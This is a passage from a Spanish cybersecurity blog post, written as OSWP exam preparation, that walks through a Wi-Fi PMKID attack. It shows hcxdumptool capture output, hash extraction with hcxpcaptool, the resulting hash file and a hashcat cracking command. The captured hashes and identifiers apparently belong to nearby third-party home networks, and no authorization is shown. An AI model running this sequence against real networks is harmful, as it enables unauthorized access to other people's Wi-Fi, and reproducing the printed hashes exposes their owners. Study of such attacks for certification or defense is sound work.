+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ hcxdumptool -i wlan0mon -o hola --enable_status=1
+initialization...
+warning: wlan0mon is probably a monitor interface
+interface is already in monitor mode
+
+start capturing (stop with ctrl+c)
+NMEA 0183 SENTENCE........: N/A
+INTERFACE NAME............: wlan0mon
+INTERFACE HARDWARE MAC....: 9cefd5f91ec0
+DRIVER....................: rt2800usb
+DRIVER VERSION............: 6.1.0-1parrot1-amd64
+DRIVER FIRMWARE VERSION...: 0.36
+ERRORMAX..................: 100 errors
+BPF code blocks...........: 0
+FILTERLIST ACCESS POINT...: 0 entries
+FILTERLIST CLIENT.........: 0 entries
+FILTERMODE................: unused
+WEAK CANDIDATE............: 12345678
+ESSID list................: 0 entries
+ROGUE (ACCESS POINT)......: 0022f185deae (BROADCAST HIDDEN)
+ROGUE (ACCESS POINT)......: 0022f100deaf (BROADCAST OPEN)
+ROGUE (ACCESS POINT)......: 0022f185deb0 (incremented on every new client)
+ROGUE (CLIENT)............: f04f7cd3562f
+EAPOLTIMEOUT..............: 20000 usec
+REPLAYCOUNT...............: 61798
+ANONCE....................: b171ddef15782b90a1026d94331ce261739adc960ab501a5849af0fa067f55fe
+SNONCE....................: 34858945004471ef3d78c90ad55b3f95d2d10a7110b447a2a771302496696048
+
+04:17:08   6 f04f7cd3562f 3c7843e84d9c Total-779D_2.4Gnormal [PMKIDROGUE:230bc6e12064d4557ad6b31aba83d8a9 KDV:2]
+04:17:12  11 f04f7cd3562f 2c79d7fd07fa TOTALPLAY_FD07FA [PMKIDROGUE:4765d871b51bc7605aa34180980bd6da KDV:2]
+04:17:13  11 f04f7cd3562f b0b28f370c54 TOTALPLAY_370C54 [PMKIDROGUE:9fb0eff55a03d437be75455790314386 KDV:2]
+04:17:36   2 f04f7cd3562f f46fed35cea8 Totalplay-2.4G-cea8 [PMKIDROGUE:2986ec13974c1c218d689a68bd90ddd3 KDV:2]
+04:17:47   1 1c4d6662ad30 3ca37ea696f0 Totalplay-76AA [EAPOL:M1M2ROGUE EAPOLTIME:9985 RC:61798 KDV:2]
+04:18:12  11 58e48850d938 9c9726c87d89 INFINITUMC87D89 [EAP REQUEST ID]
+04:18:13  11 f04f7cd3562f b0b28f3701e1 TOTALPLAY_3701E1 [PMKIDROGUE:dfb1e61987c34c26f82a0c203bfb2ff8 KDV:2]
+04:18:21  10 ec8ac43ed11e a4d4b262c37a ON_internet_2.4G_C37A [EAPOL:M1M2 EAPOLTIME:10993 RC:1 KDV:2]
+04:18:21  10 ec8ac43ed11e a4d4b262c37a ON_internet_2.4G_C37A [EAPOL:M2M3 EAPOLTIME:3479 RC:2 KDV:2]
+^C
+terminating...
+❯ 
+</code></pre></div></div>
+<ul>
+<li>Ahora usaremos <code>hcxpcaptool</code> y le daremos el nombre del archivo donde queremos que almacena los <strong>hashes</strong> finales.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ hcxpcaptool -z Myhashes hola
+
+reading from hola
+                                                
+summary capture file:                           
+---------------------
+file name........................: hola
+file type........................: pcapng 1.0
+file hardware information........: x86_64
+capture device vendor information: 9cefd5
+file os information..............: Linux 6.1.0-1parrot1-amd64
+file application information.....: hcxdumptool 6.0.5 (custom options)
+network type.....................: DLT_IEEE802_11_RADIO (127)
+endianness.......................: little endian
+read errors......................: flawless
+minimum time stamp...............: 14.09.2023 10:17:07 (GMT)
+maximum time stamp...............: 14.09.2023 10:18:35 (GMT)
+packets inside...................: 2299
+skipped damaged packets..........: 0
+packets with GPS NMEA data.......: 0
+packets with GPS data (JSON old).: 0
+packets with FCS.................: 0
+beacons (total)..................: 73
+beacons (WPS info inside)........: 16
+beacons (device info inside).....: 6
+probe requests...................: 9
+probe responses..................: 34
+association requests.............: 2
+association responses............: 29
+reassociation responses..........: 5
+authentications (OPEN SYSTEM)....: 42
+authentications (BROADCOM).......: 14
+EAPOL packets (total)............: 2103
+EAPOL packets (WPA2).............: 2103
+PMKIDs (zeroed and useless)......: 364
+PMKIDs (not zeroed - total)......: 5
+PMKIDs (WPA2)....................: 477
+PMKIDs from access points........: 5
+EAP packets......................: 2
+found............................: EAP type ID
+best handshakes (total)..........: 2 (ap-less: 1)
+best PMKIDs (total)..............: 5
+
+summary output file(s):
+-----------------------
+5 PMKID(s) written to Myhashes
+</code></pre></div></div>
+<ul>
+<li>Aquí tenemos los <strong>hashes</strong>.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ cat Myhashes
+───────┬────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: Myhashes
+───────┼────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 230bc6e12064d4557ad6b31aba83d8a9*3c7843e84d9c*f04f7cd3562f*546f74616c2d373739445f322e34476e6f726d616c
+   2   │ 4765d871b51bc7605aa34180980bd6da*2c79d7fd07fa*f04f7cd3562f*544f54414c504c41595f464430374641
+   3   │ 9fb0eff55a03d437be75455790314386*b0b28f370c54*f04f7cd3562f*544f54414c504c41595f333730433534
+   4   │ 2986ec13974c1c218d689a68bd90ddd3*f46fed35cea8*f04f7cd3562f*546f74616c706c61792d322e34472d63656138
+   5   │ dfb1e61987c34c26f82a0c203bfb2ff8*b0b28f3701e1*f04f7cd3562f*544f54414c504c41595f333730314531
+───────┴────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+</code></pre></div></div>
+<ul>
+<li>Ahora usaremos <strong>hashcat</strong> y esperaríamos a que nos de la contraseña.</li>
+</ul>
+<div class="code-window" data-language="Bash"><div class="code-window-bar"><div class="code-window-brand"><span class="term-dot red"></span><span class="term-dot yellow"></span><span class="term-dot green"></span><span class="code-file">terminal</span></div><div class="code-window-actions"><span class="code-language">Bash</span><button class="copy-code" type="button" title="Copiar código">Copy</button></div></div><div class="code-window-body"><pre><code class="language-bash">❯ hashcat -m 16800 -d 1 Myhashes /usr/share/wordlists/rockyou.txt --force
+</code></pre></div></div>
+<h2 id="final">Final</h2>
+<ul>
+<li>Pues bueno gracias por leer y nos vemos en el siguiente <strong>POST</strong> donde vamos a estar resolviendo los challenges de <strong>WifiChallengeLab</strong> <a href="https://wifichallengelab.com/">https://wifichallengelab.com/</a> para aplicar lo aprendiendo e ir preparándonos mucho mas para el <strong>OSWP</strong> bueno algo a saber es que el <strong>OSWP</strong> se sentra mas en el protocolo <strong>WEP</strong> que ya no se usa mucho hay ataques como el <strong>Fake Authentication Attack</strong>, <strong>ARP Replay Attack</strong>, <strong>Chop Chop Attack</strong>, entre otros que también tenemos que entrenar contra ese protocolo para el siguiente post también adjuntare una herramienta en <strong>bash</strong> para automatizar algunos ataques que hicimos hecha por mi así que gracias por leer y nos vemos.</li>
+</ul>
+</article></div></main>
+<footer class="footer wrap"><div><b>MR<em>7</em></b><div>Cybersecurity notes &amp; writeups.</div></div><div class="footer-links"><a href="https://github.com/MikeRega7">GitHub</a><a href="https://www.linkedin.com/in/juan-miguel-regalado-nu%C3%B1o-a3b14b278">LinkedIn</a><a href="https://www.instagram.com/_miguelitornuno7">Instagram</a></div></footer>
+<script src="/app.js?v=10"></script></body></html>
